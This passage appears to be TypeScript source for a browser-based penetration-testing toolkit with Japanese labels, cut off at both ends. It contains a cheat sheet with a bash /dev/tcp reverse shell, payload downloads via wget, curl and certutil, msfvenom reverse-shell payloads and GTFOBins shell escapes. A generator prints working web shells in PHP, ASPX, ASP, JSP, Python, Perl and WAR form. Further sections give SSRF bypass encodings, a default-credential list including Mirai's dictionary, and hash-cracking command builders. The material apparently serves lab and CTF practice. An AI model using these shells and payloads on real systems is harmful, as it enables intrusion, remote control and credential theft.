hashcat -m 1800 hash.txt rockyou.txt                          # SHA-512 crypt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ssh2john id_rsa > hash; john hash --wordlist=rockyou.txt
zip2john file.zip > hash
rar2john file.rar > hash

# === sqlmap ===
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -r req.txt -p username --dbs                     # Burp で保存した raw リクエスト
sqlmap -r req.txt -p username --current-user
sqlmap -r req.txt -D <db> --tables
sqlmap -r req.txt -D <db> -T <tbl> --dump
sqlmap -u "..." --os-shell

# === リバースシェル ===
nc -lvnp 4444                                             # リスナー
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")'           # PTY 安定化
Ctrl+Z; stty raw -echo; fg; reset                        # フル端末

# === 権限昇格 (Linux) ===
sudo -l                                                    # 何が NOPASSWD で実行できるか
find / -perm -u=s -type f 2>/dev/null                     # SUID
find / -perm -4000 2>/dev/null
find / -writable -type f 2>/dev/null
getcap -r / 2>/dev/null                                    # capabilities
cat /etc/crontab                                          # cron
ls -la /etc/cron.*
./linpeas.sh
./LinEnum.sh
# 配信:
python3 -m http.server 8000             # 攻撃側
wget http://<LHOST>:8000/linpeas.sh     # 被害側
chmod +x linpeas.sh && ./linpeas.sh

# === 権限昇格 (Windows) ===
whoami /priv
whoami /groups
systeminfo
.\\winPEASany.exe
.\\PowerUp.ps1; Invoke-AllChecks

# === GTFOBins (sudo / SUID 抜け道の代表) ===
sudo systemctl ; sudo find / -exec /bin/sh \\;
sudo vim -c ':!/bin/sh' ; sudo less file ; !sh
SUID /bin/bash → /bin/bash -p

# === ファイル転送 ===
# 攻撃側:
python3 -m http.server 80
# 被害側:
wget http://<LHOST>/file
curl -O http://<LHOST>/file
certutil -urlcache -f http://<LHOST>/file file.exe   # Windows

# === MSF ===
msfconsole
search <name>
use <id>; show options; set RHOSTS <IP>; run
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > sh.exe
`;

function setupPentestTool(): void {
  setupPortScannerSub();
  setupHttpReqSub();
  setupDirBusterSub();
  setupSqliSub();
  setupHashIdSub();
  setupHashGenSub();
  setupEncodeSub();
  setupRevShellSub();
  setupJwtSub();
  setupDnsSub();
  setupSensitiveFilesSub();
  setupSubnetSub();
  setupSecHeadersSub();
  setupHttpMethodsSub();
  setupCorsTesterSub();
  setupOpenRedirectSub();
  setupFormExtractorSub();
  setupCookieAnalyzerSub();
  setupSecretsScannerSub();
  setupSubdomainSub();
  setupWaybackSub();
  setupCveLookupSub();
  setupPayloadLibrarySub();
  setupGtfoLolbasSub();
  setupUsernameGenSub();
  setupWordlistMutSub();
  setupJwtBruteSub();
  setupNtlmSub();
  setupMsfvenomSub();
  setupPrivescChecklistSub();
  setupUuidSub();
  setupIpObfSub();
  setupWebShellSub();
  setupCyclicSub();
  setupRobotsSub();
  setupHibpSub();
  setupGraphQLSub();
  setupEntropySub();
  setupDefaultCredsSub();
  setupOsintLinksSub();
  setupHashcatBuilderSub();
  setupHostHeaderSub();
  setupGitExposureSub();
  setupSourceMapSub();
  setupMagicBytesSub();
  setupFlagExtractSub();
  setupRespDiffSub();
  setupConfigSnippetSub();
  const cheat = document.getElementById("thm-cheat");
  if (cheat) cheat.textContent = THM_CHEAT;
}

// ===== 🧬 UUID / GUID =====
function setupUuidSub(): void {
  const inEl = document.getElementById("uuid-input") as HTMLInputElement | null;
  const btn = document.getElementById("uuid-run") as HTMLButtonElement | null;
  const gen = document.getElementById("uuid-gen") as HTMLButtonElement | null;
  const out = document.getElementById("uuid-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const v = (inEl?.value || "").trim().toLowerCase();
    const m =
      /^([0-9a-f]{8})-?([0-9a-f]{4})-?([0-9a-f]{4})-?([0-9a-f]{4})-?([0-9a-f]{12})$/.exec(
        v,
      );
    if (!m) {
      out.textContent = "UUID 形式ではありません";
      return;
    }
    const ver = parseInt(m[3][0], 16);
    const variantBits = parseInt(m[4][0], 16);
    let variant = "Reserved";
    if ((variantBits & 0b1000) === 0) variant = "NCS (legacy)";
    else if ((variantBits & 0b1100) === 0b1000) variant = "RFC 4122";
    else if ((variantBits & 0b1110) === 0b1100) variant = "Microsoft GUID";
    const lines = [
      `入力     : ${m[1]}-${m[2]}-${m[3]}-${m[4]}-${m[5]}`,
      `Version  : ${ver}`,
      `Variant  : ${variant}`,
    ];
    if (ver === 1) {
      // v1: time + node MAC
      const timeHex = m[3].slice(1) + m[2] + m[1]; // time-high/mid/low
      const ts100ns = BigInt("0x" + timeHex);
      const epoch1582 = BigInt("122192928000000000");
      const ms = Number((ts100ns - epoch1582) / BigInt(10000));
      lines.push(`Timestamp: ${new Date(ms).toISOString()}`);
      lines.push(`Node MAC : ${m[5].match(/.{2}/g)?.join(":")}`);
      const mcByte = parseInt(m[5].slice(0, 2), 16);
      lines.push(`         (${mcByte & 1 ? "ランダム" : "実 MAC の可能性"})`);
    } else if (ver === 4) {
      lines.push(`(v4: ランダム生成 — 推測不能)`);
    } else if (ver === 7) {
      const tsHex = m[1] + m[2];
      const ms = parseInt(tsHex, 16);
      lines.push(`Timestamp: ${new Date(ms).toISOString()}`);
    }
    out.textContent = lines.join("\n");
  });
  gen?.addEventListener("click", () => {
    const b = new Uint8Array(16);
    crypto.getRandomValues(b);
    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;
    const h = Array.from(b).map((x) => x.toString(16).padStart(2, "0"));
    const u = `${h.slice(0, 4).join("")}-${h.slice(4, 6).join("")}-${h.slice(6, 8).join("")}-${h.slice(8, 10).join("")}-${h.slice(10, 16).join("")}`;
    if (inEl) inEl.value = u;
    out.textContent = `生成: ${u}`;
  });
}

// ===== 🔢 IP 難読化 =====
function setupIpObfSub(): void {
  const inEl = document.getElementById("ipo-input") as HTMLInputElement | null;
  const btn = document.getElementById("ipo-run") as HTMLButtonElement | null;
  const out = document.getElementById("ipo-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const v = (inEl?.value || "").trim();
    const n = ipToInt(v);
    if (isNaN(n)) {
      out.textContent = "IPv4 アドレスを入力してください";
      return;
    }
    const o = [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
    const dec = n.toString(10);
    const hex = "0x" + n.toString(16);
    const lines = [
      `元           : ${v}`,
      `10進 (整数)  : http://${dec}/`,
      `16進 (整数)  : http://${hex}/`,
      `16進 (各octet): http://${o.map((x) => "0x" + x.toString(16)).join(".")}/`,
      `8進 (各octet): http://${o.map((x) => "0" + x.toString(8)).join(".")}/`,
      `混合         : http://${o[0]}.${o[1]}.${(o[2] << 8) | o[3]}/`,
      `2 octet      : http://${o[0]}.${(o[1] << 16) | (o[2] << 8) | o[3]}/`,
      `先頭ゼロ     : http://${o.map((x) => "0".repeat(3) + x).join(".")}/`,
      `URL@bypass   : http://example.com@${v}/`,
      `nip.io       : http://${v}.nip.io/`,
      `xip.io       : http://${v}.xip.io/`,
    ];
    if (o[0] === 127) {
      lines.push(``, `# SSRF / loopback 短縮表記`);
      lines.push(`http://127.1/`);
      lines.push(`http://0/`);
      lines.push(`http://[::1]/`);
      lines.push(`http://[::ffff:127.0.0.1]/`);
    }
    out.textContent = lines.join("\n");
  });
}

// ===== 🐚 Web シェル スニペット =====
const WEBSHELLS: Record<string, (p: string) => string> = {
  php: (p) =>
    `<?php // 1-liner web shell — 使用には書面同意必須\nif(isset($_REQUEST['${p}'])){ system($_REQUEST['${p}']); }\n// 例: http://victim/shell.php?${p}=id\n\n// 代替 (関数フィルタ回避)\n<?php @eval($_REQUEST['${p}']); ?>\n<?php @system($_REQUEST['${p}']); ?>\n<?php passthru($_REQUEST['${p}']); ?>\n<?php echo shell_exec($_REQUEST['${p}']); ?>\n<?=\`{$_GET['${p}']}\`?>`,
  aspx: (p) =>
    `<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%\nstring c = Request["${p}"];\nif (!string.IsNullOrEmpty(c)) {\n  ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);\n  psi.RedirectStandardOutput = true; psi.UseShellExecute = false;\n  Process p = Process.Start(psi);\n  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");\n}\n%>`,
  asp: (p) =>
    `<%\nDim oS\nSet oS = Server.CreateObject("WSCRIPT.SHELL")\nSet oE = oS.exec("cmd.exe /c " & Request("${p}"))\nResponse.Write("<pre>" & oE.StdOut.ReadAll() & "</pre>")\n%>`,
  jsp: (p) =>
    `<%@ page import="java.util.*,java.io.*"%>\n<%\nString c = request.getParameter("${p}");\nif (c != null) {\n  Process pr = Runtime.getRuntime().exec(new String[]{"sh","-c",c});\n  BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n  String l;\n  out.println("<pre>");\n  while ((l = br.readLine()) != null) out.println(l);\n  out.println("</pre>");\n}\n%>`,
  py: (p) =>
    `#!/usr/bin/env python3\nimport cgi, subprocess, html\nprint("Content-Type: text/html\\n")\nf = cgi.FieldStorage()\nc = f.getvalue("${p}", "")\nif c:\n    r = subprocess.run(c, shell=True, capture_output=True, text=True)\n    print("<pre>" + html.escape(r.stdout + r.stderr) + "</pre>")`,
  pl: (p) =>
    `#!/usr/bin/perl\nuse CGI;\nmy $q = CGI->new;\nmy $c = $q->param('${p}');\nprint "Content-Type: text/html\\n\\n";\nif ($c) { print "<pre>" . \`$c\` . "</pre>"; }`,
  war: () =>
    `# WAR ファイル作成 (cmd.jsp を中に同梱)\n# 1) cmd.jsp を用意\ncat > cmd.jsp <<'EOF'\n<%@ page import="java.util.*,java.io.*"%>\n<% String c=request.getParameter("cmd");\nif(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});\nBufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));\nString l;out.println("<pre>");while((l=b.readLine())!=null)out.println(l);out.println("</pre>");}%>\nEOF\n# 2) jar / zip でパッケージ\njar -cvf shell.war cmd.jsp\n# または\nzip shell.war cmd.jsp\n# 3) Tomcat manager 等にデプロイ → /shell/cmd.jsp?cmd=id\n\n# msfvenom でも生成可能\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o shell.war`,
};
function setupWebShellSub(): void {
  const sel = document.getElementById("ws-lang") as HTMLSelectElement | null;
  const par = document.getElementById("ws-param") as HTMLInputElement | null;
  const out = document.getElementById("ws-out") as HTMLPreElement | null;
  if (!sel || !out) return;
  const render = (): void => {
    const lang = sel.value;
    const p = (par?.value || "cmd").trim() || "cmd";
    const fn = WEBSHELLS[lang];
    out.textContent = fn ? fn(p) : "";
  };
  sel.addEventListener("change", render);
  par?.addEventListener("input", render);
  render();
}

// ===== 🧨 Cyclic パターン =====
function cyclicGen(len: number): string {
  // Metasploit の pattern_create と同じ 4-byte ユニーク
  const U = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const L = "abcdefghijklmnopqrstuvwxyz";
  const D = "0123456789";
  let s = "";
  outer: for (const a of U)
    for (const b of L)
      for (const c of D) {
        for (let i = 0; i < c.length || i === 0; i++) {
          // pattern_create は 3rd を A-Za-z0-9, 4th を 0-9 ループ
        }
        for (const d of D) {
          s += a + b + c + d;
          if (s.length >= len) break outer;
        }
      }
  return s.slice(0, len);
}
function cyclicFind(pattern: string, needle: string): number {
  // needle が 0x で始まる16進(リトルエンディアン4byte想定)なら ASCII 文字に変換
  let n = needle.trim();
  if (/^0x[0-9a-f]+$/i.test(n)) {
    const hex = n.slice(2).padStart(8, "0");
    const bytes: string[] = [];
    for (let i = hex.length - 2; i >= 0; i -= 2)
      bytes.push(String.fromCharCode(parseInt(hex.slice(i, i + 2), 16)));
    n = bytes.join("");
  }
  return pattern.indexOf(n);
}
function setupCyclicSub(): void {
  const len = document.getElementById("cyc-len") as HTMLInputElement | null;
  const gen = document.getElementById("cyc-gen") as HTMLButtonElement | null;
  const find = document.getElementById("cyc-find") as HTMLInputElement | null;
  const off = document.getElementById("cyc-off") as HTMLButtonElement | null;
  const out = document.getElementById("cyc-out") as HTMLPreElement | null;
  if (!gen || !off || !out) return;
  let lastPattern = "";
  gen.addEventListener("click", () => {
    const n = Math.max(1, Math.min(20280, parseInt(len?.value || "200", 10)));
    lastPattern = cyclicGen(n);
    out.textContent = lastPattern;
  });
  off.addEventListener("click", () => {
    if (!lastPattern) {
      const n = Math.max(1, Math.min(20280, parseInt(len?.value || "200", 10)));
      lastPattern = cyclicGen(n);
    }
    const needle = (find?.value || "").trim();
    if (!needle) {
      out.textContent = "EIP/RIP の値 (例: 0x37654136 または Aa6Ae) を入力";
      return;
    }
    const idx = cyclicFind(lastPattern, needle);
    out.textContent =
      idx < 0
        ? `❌ オフセット見つからず (パターン長 ${lastPattern.length} を増やすか、リトル/ビッグエンディアンを確認)`
        : `✅ オフセット: ${idx} バイト\nパターン長: ${lastPattern.length}\n→ exploit 内で 'A'*${idx} + 'BBBB' でリターンアドレス上書きを確認`;
  });
}

// ===== 🤖 robots.txt / sitemap =====
function setupRobotsSub(): void {
  const inEl = document.getElementById("rob-url") as HTMLInputElement | null;
  const btn = document.getElementById("rob-run") as HTMLButtonElement | null;
  const out = document.getElementById("rob-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    let base = (inEl?.value || "").trim();
    if (!base) return;
    base = base.replace(/\/+$/, "");
    out.textContent = "取得中...";
    const targets = [
      "/robots.txt",
      "/sitemap.xml",
      "/sitemap_index.xml",
      "/.well-known/security.txt",
      "/.well-known/openid-configuration",
      "/.well-known/host-meta",
      "/humans.txt",
      "/crossdomain.xml",
      "/clientaccesspolicy.xml",
    ];
    const lines: string[] = [];
    for (const path of targets) {
      const url = base + path;
      try {
        const r = await fetch(url);
        if (r.ok) {
          const t = await r.text();
          lines.push(
            `=== ${url} (${r.status}) ===\n${t.slice(0, 4000)}${t.length > 4000 ? "\n…(truncated)" : ""}\n`,
          );
        } else {
          lines.push(`--- ${url} → ${r.status}`);
        }
      } catch (e) {
        lines.push(`!!! ${url} → ${String(e).slice(0, 80)}`);
      }
    }
    out.textContent = lines.join("\n");
  });
}

// ===== 🧪 HIBP k-anonymity =====
async function sha1Hex(s: string): Promise<string> {
  const buf = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(s));
  return Array.from(new Uint8Array(buf))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("")
    .toUpperCase();
}
function setupHibpSub(): void {
  const inEl = document.getElementById("hibp-pw") as HTMLInputElement | null;
  const btn = document.getElementById("hibp-run") as HTMLButtonElement | null;
  const out = document.getElementById("hibp-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const pw = inEl?.value || "";
    if (!pw) return;
    out.textContent = "ハッシュ化 & 問合せ中...";
    try {
      const h = await sha1Hex(pw);
      const prefix = h.slice(0, 5);
      const suffix = h.slice(5);
      const r = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
        headers: { "Add-Padding": "true" },
      });
      if (!r.ok) throw new Error("HIBP: " + r.status);
      const txt = await r.text();
      const hit = txt
        .split(/\r?\n/)
        .map((l) => l.split(":"))
        .find(([s]) => s.trim().toUpperCase() === suffix);
      if (hit) {
        out.textContent = `🚨 漏洩確認: このパスワードは ${parseInt(hit[1], 10).toLocaleString()} 回 漏洩データに登場しています\nSHA-1: ${h}`;
      } else {
        out.textContent = `✅ HIBP の漏洩データには登場していません\nSHA-1: ${h}`;
      }
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 📡 GraphQL Introspection =====
const GQL_INTROSPECTION = `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated:true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }`;
function setupGraphQLSub(): void {
  const u = document.getElementById("gql-url") as HTMLInputElement | null;
  const a = document.getElementById("gql-auth") as HTMLInputElement | null;
  const btn = document.getElementById("gql-run") as HTMLButtonElement | null;
  const out = document.getElementById("gql-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (u?.value || "").trim();
    if (!url) return;
    out.textContent = "イントロスペクション送信中...";
    const headers: Record<string, string> = {
      "Content-Type": "application/json",
    };
    if (a?.value.trim()) headers["Authorization"] = a.value.trim();
    try {
      const r = await fetch(url, {
        method: "POST",
        headers,
        body: JSON.stringify({ query: GQL_INTROSPECTION }),
      });
      const data = (await r.json()) as {
        data?: {
          __schema?: {
            types?: {
              name: string;
              kind: string;
              fields?: { name: string; args?: unknown[] }[];
            }[];
          };
        };
        errors?: { message: string }[];
      };
      if (data.errors) {
        out.textContent = `⚠️ エラー (introspection 無効化済み?):\n${JSON.stringify(data.errors, null, 2)}`;
        return;
      }
      const types = data.data?.__schema?.types || [];
      const interesting = types.filter(
        (t) =>
          !t.name.startsWith("__") &&
          (t.kind === "OBJECT" || t.kind === "INPUT_OBJECT"),
      );
      const summary = interesting
        .map((t) => {
          const flds = t.fields
            ? "\n  " +
              t.fields
                .map(
                  (f) => `${f.name}${f.args && f.args.length ? "(...)" : ""}`,
                )
                .join(", ")
            : "";
          return `[${t.kind}] ${t.name}${flds}`;
        })
        .join("\n");
      out.textContent = `🚨 Introspection が有効です (${interesting.length} types)\n\n${summary}`;
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 🧮 Shannon エントロピー =====
function setupEntropySub(): void {
  const inEl = document.getElementById(
    "ent-input",
  ) as HTMLTextAreaElement | null;
  const btn = document.getElementById("ent-run") as HTMLButtonElement | null;
  const out = document.getElementById("ent-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const s = inEl?.value || "";
    if (!s) {
      out.textContent = "";
      return;
    }
    const counts: Record<string, number> = {};
    for (const c of s) counts[c] = (counts[c] || 0) + 1;
    const len = s.length;
    let H = 0;
    for (const k in counts) {
      const p = counts[k] / len;
      H -= p * Math.log2(p);
    }
    const charset =
      (/[a-z]/.test(s) ? 26 : 0) +
      (/[A-Z]/.test(s) ? 26 : 0) +
      (/[0-9]/.test(s) ? 10 : 0) +
      (/[^A-Za-z0-9]/.test(s) ? 32 : 0);
    const bruteBits = len * Math.log2(charset || 1);
    const guess =
      H > 4.5
        ? "高 (鍵/トークン候補)"
        : H > 3.5
          ? "中 (混合文字列)"
          : H > 2.0
            ? "低 (英単語/パスワード)"
            : "極低 (繰返し/単一文字種)";
    out.textContent =
      `長さ           : ${len}\n` +
      `ユニーク文字数 : ${Object.keys(counts).length}\n` +
      `Shannon Entropy: ${H.toFixed(3)} bit/char\n` +
      `総エントロピー : ${(H * len).toFixed(2)} bit\n` +
      `Brute (charset推定): ${bruteBits.toFixed(1)} bit (charset=${charset})\n` +
      `判定           : ${guess}`;
  });
}

// ===== 🚪 デフォルト認証情報 =====
const DEFAULT_CREDS: [string, string, string][] = [
  ["Tomcat Manager", "tomcat", "tomcat / s3cret / admin / role1"],
  ["Tomcat Manager", "admin", "admin / password / (空)"],
  ["Jenkins", "admin", "admin / password / jenkins"],
  [
    "Jenkins (初期)",
    "admin",
    "$JENKINS_HOME/secrets/initialAdminPassword 参照",
  ],
  ["GitLab", "root", "5iveL!fe (古い) / 自動生成パスワード"],
  ["Grafana", "admin", "admin"],
  ["Kibana / Elasticsearch", "elastic", "changeme"],
  ["MongoDB (古い)", "(なし)", "認証無効が既定 (< 3.6)"],
  ["MySQL", "root", "(空) / root / mysql"],
  ["MariaDB", "root", "(空) / root"],
  ["PostgreSQL", "postgres", "postgres / (空) / admin"],
  ["Redis", "(なし)", "認証無効が既定"],
  ["Memcached", "(なし)", "認証無効が既定"],
  ["RabbitMQ", "guest", "guest"],
  ["phpMyAdmin", "root", "(空) / root"],
  ["WordPress", "admin", "admin / password / wordpress"],
  ["Joomla admin", "admin", "admin"],
  ["Drupal admin", "admin", "admin"],
  ["Webmin", "admin", "admin / root"],
  ["cPanel", "root", "(購入時のもの) / 1q2w3e4r"],
  ["Plesk", "admin", "setup / admin"],
  ["pfSense", "admin", "pfsense"],
  ["OPNsense", "root", "opnsense"],
  ["Cisco IOS", "cisco", "cisco / admin"],
  ["Cisco ASA", "(なし)", "enable: cisco"],
  ["MikroTik RouterOS", "admin", "(空)"],
  ["Ubiquiti UniFi", "ubnt", "ubnt"],
  ["TP-Link Router", "admin", "admin"],
  ["D-Link Router", "admin", "(空) / admin"],
  ["Netgear Router", "admin", "password"],
  ["ZTE Router", "admin", "admin / Zte521"],
  ["Huawei Router", "telecomadmin", "admintelecom / admin"],
  ["Asus Router", "admin", "admin"],
  ["Linksys Router", "admin", "admin / (空)"],
  ["BMC / IPMI / iLO", "ADMIN", "ADMIN / admin / calvin (Dell iDRAC)"],
  ["Dell iDRAC", "root", "calvin"],
  ["HPE iLO", "Administrator", "(シリアル裏面のシール)"],
  ["Supermicro IPMI", "ADMIN", "ADMIN"],
  ["Apache ActiveMQ", "admin", "admin"],
  ["Apache Kafka Manager", "admin", "(なし — 外部公開注意)"],
  ["JBoss / WildFly", "admin", "admin / jboss / changeme"],
  ["WebLogic", "weblogic", "weblogic / weblogic1 / Oracle@123"],
  ["WebSphere", "admin", "admin"],
  ["Splunk", "admin", "changeme / admin"],
  ["Nagios XI", "nagiosadmin", "PIXIE (旧) / 自動生成"],
  ["Zabbix", "Admin", "zabbix"],
  ["Sonatype Nexus", "admin", "admin123 / 自動生成 (3.17+)"],
  ["JFrog Artifactory", "admin", "password"],
  ["Solr admin", "(なし)", "認証無効が既定"],
  ["Couchbase", "Administrator", "password"],
  ["InfluxDB v1", "(なし)", "認証無効が既定"],
  ["Redis (Sentinel)", "(なし)", "認証無効が既定"],
  ["Cassandra", "cassandra", "cassandra"],
  ["Neo4j", "neo4j", "neo4j (初回変更必須)"],
  ["FTP (anonymous)", "anonymous", "anonymous@ / (空)"],
  ["Telnet (組込み)", "root", "root / (空) / admin"],
  ["VNC", "(なし)", "パスワード無し or password"],
  ["RDP (Win XP評価版)", "Administrator", "(空)"],
  ["printer (HP/Xerox)", "admin", "1234 / (空) / @0123456789"],
  ["IP camera", "admin", "admin / 12345 / (空) / 888888"],
  ["Hikvision", "admin", "12345"],
  ["Dahua", "admin", "admin"],
  [
    "Mirai 標的辞書",
    "root/admin/...",
    "root:xc3511, root:vizxv, admin:admin, root:888888, ...",
  ],
  ["Docker Registry", "(なし)", "認証無効が既定 (要 nginx 前段)"],
  ["Portainer", "admin", "(初回設定) / admin"],
  ["Rancher", "admin", "admin"],
  ["Kubernetes Dashboard", "(skip)", "RBAC 設定不備でフルアクセス"],
];
function setupDefaultCredsSub(): void {
  const filt = document.getElementById("dc-filter") as HTMLInputElement | null;
  const out = document.getElementById("dc-out") as HTMLPreElement | null;
  if (!out) return;
  const render = (): void => {
    const f = (filt?.value || "").toLowerCase();
    const rows = DEFAULT_CREDS.filter(([n]) =>
      f ? n.toLowerCase().includes(f) : true,
    );
    out.textContent =
      `${rows.length} 件\n\n` +
      rows
        .map(
          ([n, u, p]) => `• ${n.padEnd(28)} user: ${u.padEnd(18)} pass: ${p}`,
        )
        .join("\n");
  };
  filt?.addEventListener("input", render);
  render();
}

// ===== 🌀 OSINT クイック検索 =====
function setupOsintLinksSub(): void {
  const q = document.getElementById("osi-q") as HTMLInputElement | null;
  const btn = document.getElementById("osi-run") as HTMLButtonElement | null;
  const out = document.getElementById("osi-out") as HTMLDivElement | null;
  if (!btn || !out) return;
  const run = (): void => {
    const v = (q?.value || "").trim();
    if (!v) {
      out.innerHTML = "";
      return;
    }
    const e = encodeURIComponent(v);
    const links: [string, string][] = [
      [`Shodan`, `https://www.shodan.io/search?query=${e}`],
      [`Shodan (host)`, `https://www.shodan.io/host/${e}`],
      [`Censys`, `https://search.censys.io/search?resource=hosts&q=${e}`],
      [`FOFA`, `https://en.fofa.info/result?qbase64=${btoa(`"${v}"`)}`],
      [`ZoomEye`, `https://www.zoomeye.org/searchResult?q=${e}`],
      [`VirusTotal`, `https://www.virustotal.com/gui/search/${e}`],
      [`AbuseIPDB`, `https://www.abuseipdb.com/check/${e}`],
      [`urlscan.io`, `https://urlscan.io/search/#${e}`],
      [`SecurityTrails`, `https://securitytrails.com/list/apex_domain/${e}`],
      [`crt.sh`, `https://crt.sh/?q=%25.${e}`],
      [`DNSDumpster`, `https://dnsdumpster.com/`],
      [
        `AlienVault OTX`,
        `https://otx.alienvault.com/browse/global/indicators?q=${e}`,
      ],
      [`GreyNoise`, `https://viz.greynoise.io/ip/${e}`],
      [
        `MXToolbox`,
        `https://mxtoolbox.com/SuperTool.aspx?action=mx&run=toolpage&q=${e}`,
      ],
      [`whois (whois.com)`, `https://www.whois.com/whois/${e}`],
      [`Wayback Machine`, `https://web.archive.org/web/*/${e}`],
      [`Google dork`, `https://www.google.com/search?q=site%3A${e}`],
      [`GitHub`, `https://github.com/search?q=${e}&type=code`],
      [`HIBP (email)`, `https://haveibeenpwned.com/account/${e}`],
      [`Hunter.io`, `https://hunter.io/search/${e}`],
      [`Gravatar`, `https://en.gravatar.com/${e}`],
    ];
    out.innerHTML =
      `<div style="display:flex;flex-wrap:wrap;gap:6px">` +
      links
        .map(
          ([n, u]) =>
            `<a href="${u}" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f;text-decoration:none">${escapeHtml(n)}</a>`,
        )
        .join("") +
      `</div>`;
  };
  btn.addEventListener("click", run);
  q?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") run();
  });
}

// ===== 🧰 hashcat / john ビルダー =====
function detectHashcatMode(h: string): { mode: string; name: string } | null {
  const x = h.trim();
  if (/^[a-f0-9]{32}$/i.test(x)) return { mode: "0", name: "MD5" };
  if (/^[a-f0-9]{40}$/i.test(x)) return { mode: "100", name: "SHA1" };
  if (/^[a-f0-9]{64}$/i.test(x)) return { mode: "1400", name: "SHA256" };
  if (/^[a-f0-9]{128}$/i.test(x)) return { mode: "1700", name: "SHA512" };
  if (/^\$1\$/.test(x)) return { mode: "500", name: "md5crypt" };
  if (/^\$5\$/.test(x)) return { mode: "7400", name: "sha256crypt" };
  if (/^\$6\$/.test(x)) return { mode: "1800", name: "sha512crypt" };
  if (/^\$2[abxy]\$/.test(x)) return { mode: "3200", name: "bcrypt" };
  if (/^\$argon2/.test(x)) return { mode: "13300", name: "Argon2 (要 -m)" };
  if (/^[A-Z0-9]+:[a-f0-9]{32}:[a-f0-9]{32}/i.test(x))
    return { mode: "5600", name: "NetNTLMv2" };
  if (/^\$krb5tgs\$/i.test(x))
    return { mode: "13100", name: "Kerberos TGS-REP" };
  if (/^\$krb5asrep\$/i.test(x))
    return { mode: "18200", name: "Kerberos AS-REP (AS-REP roast)" };
  if (/^eyJ[A-Za-z0-9_-]+\./.test(x))
    return { mode: "16500", name: "JWT (HS256)" };
  return null;
}
function setupHashcatBuilderSub(): void {
  const h = document.getElementById("hc-hash") as HTMLInputElement | null;
  const m = document.getElementById("hc-mode") as HTMLSelectElement | null;
  const out = document.getElementById("hc-out") as HTMLPreElement | null;
  if (!out) return;
  const run = (): void => {
    const hv = (h?.value || "").trim();
    if (!hv) {
      out.textContent = "";
      return;
    }
    let mode = m?.value || "auto";
    let name = "";
    if (mode === "auto") {
      const d = detectHashcatMode(hv);
      if (!d) {
        out.textContent = "自動判定失敗。モードを手動選択してください";
        return;
      }
      mode = d.mode;
      name = ` (検出: ${d.name})`;
    }
    const lines = [
      `# hashcat${name}`,
      `echo '${hv}' > hash.txt`,
      ``,
      `# 辞書`,
      `hashcat -m ${mode} -a 0 hash.txt /usr/share/wordlists/rockyou.txt`,
      ``,
      `# 辞書 + ルール`,
      `hashcat -m ${mode} -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`,
      ``,
      `# ブルートフォース (?a = all)`,
      `hashcat -m ${mode} -a 3 hash.txt ?a?a?a?a?a?a?a?a --increment`,
      ``,
      `# マスク (8文字, 英小+数字)`,
      `hashcat -m ${mode} -a 3 hash.txt ?l?l?l?l?l?l?d?d`,
      ``,
      `# 結果表示`,
      `hashcat -m ${mode} hash.txt --show`,
      ``,
      `# john the ripper (互換 — フォーマット自動判定)`,
      `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`,
      `john --show hash.txt`,
    ];
    out.textContent = lines.join("\n");
  };
  h?.addEventListener("input", run);
  m?.addEventListener("change", run);
}

// ===== 🪞 Host Header injection =====
function setupHostHeaderSub(): void {
  const u = document.getElementById("hh-url") as HTMLInputElement | null;
  const a = document.getElementById("hh-attacker") as HTMLInputElement | null;
  const btn = document.getElementById("hh-run") as HTMLButtonElement | null;
  const out = document.getElementById("hh-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (u?.value || "").trim();
    const evil = (a?.value || "evil.com").trim();
    if (!url) return;
    out.textContent = "テスト中...";
    const headers: [string, Record<string, string>][] = [
      ["X-Forwarded-Host", { "X-Forwarded-Host": evil }],
